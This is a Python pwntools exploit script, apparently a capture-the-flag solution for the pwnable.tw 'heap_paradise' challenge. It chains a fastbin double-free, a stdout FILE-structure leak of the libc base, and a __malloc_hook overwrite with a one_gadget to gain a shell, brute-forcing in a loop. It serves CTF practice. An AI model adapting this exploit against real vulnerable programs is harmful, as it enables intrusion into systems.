#!/usr/bin/env python3
from pwn import *
import sys

libc = ELF('./lib/libc.so.6')

context.log_level = 'debug'

po = p16(0x4640)

def add(size, dat, sh=False):
	p.sendlineafter(b'You Choice:', b'1')
	p.sendlineafter(b'Size :', str(size).encode())

	if sh:
		p.interactive()

	p.sendafter(b'Data :', dat)

def free(idx):	
	p.sendlineafter(b'You Choice:', b'2')
	p.sendlineafter(b'Index :', str(idx).encode())

signal.signal(signal.SIGINT, lambda sig, frame: sys.exit(0))

while True:
	try:
		p = process('./heap_paradise')
		#p = remote('chall.pwnable.tw', 10308)

		add(0x68, p64(0) * 9 + p64(0x71))
		add(0x68, p64(0) * 9 + p64(0x21))

		add(0x78, (p64(0) * 3 + p64(0x21)) * 2)

		free(0)
		free(1)
		free(0)

		add(0x68, b'\x50')

		add(0x68, b'\x10')
		add(0x68, b'\x10')

		add(0x68, p64(0) * 3 + p64(0x91) + p64(0))

		free(1)
		free(6)

		add(0x68, p64(0) * 3 + p64(0x71) + p16(0x45dd))

		free(0)
		free(6)
		free(0)

		add(0x68, p64(0) * 9 + p64(0x71) + b'\x70')
		add(0x68, b'a')
		add(0x68, b'a')

		pause()

		payload = flat(
			p64(0) * 6, b'\x00' * 3,
			p64(0xfbad1887),
			p64(0) * 3,
			b'\x88'
		)

		add(0x68, payload)

		pause()
		libc.address = u64(p.recv(6).ljust(8, b'\x00')) - 0x3c38e0
		og = libc.address + 0xef6c4

		log.success(hex(libc.address))

		free(0)
		free(6)
		free(0)

		add(0x68, p64(0) * 9 + p64(0x71) + p64(libc.sym['__malloc_hook'] - 0x23))
		add(0x68, b'a')
		add(0x68, p64(0xdeadbeef) * 2 + b'\x00' * 3 + p64(og))

		pause()
		add(0, b'a', True)
	except EOFError:
		p.close()
		continue
